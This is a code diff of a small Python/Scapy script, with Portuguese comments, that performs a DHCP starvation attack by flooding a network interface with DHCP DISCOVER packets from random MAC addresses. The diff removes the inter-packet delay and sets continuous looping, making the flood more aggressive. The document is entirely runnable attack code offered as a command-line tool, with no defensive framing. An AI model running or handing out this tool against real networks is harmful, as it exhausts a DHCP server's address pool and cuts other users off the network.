@@ -2,7 +2,7 @@ import argparse
 import time
 from scapy.all import *
 
-def dhcp_starvation(iface, delay=0.1):
+def dhcp_starvation(iface):
     conf.checkIPaddr = False 
 
     while True:
@@ -12,16 +12,13 @@ def dhcp_starvation(iface, delay=0.1):
                     / BOOTP(op=1, chaddr=RandMAC()) \
                     / DHCP(options=[('message-type', 'discover'), ('end')])
 
-        sendp(DHCP_DISCOVER, iface=iface, verbose=1)
-        time.sleep(delay)  # Adiciona um atraso entre os pacotes
+        sendp(DHCP_DISCOVER, iface=iface,loop=1, verbose=1)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Script para executar DHCP Starvation.')
     parser.add_argument('-i', '--interface', type=str, required=True, help='Interface de rede a ser usada para o ataque')
 
     args = parser.parse_args()
-    
-    delay = 0.1  # Valor do atraso entre pacotes em segundos
 
-    dhcp_starvation(args.interface, delay)
+    dhcp_starvation(args.interface)
 
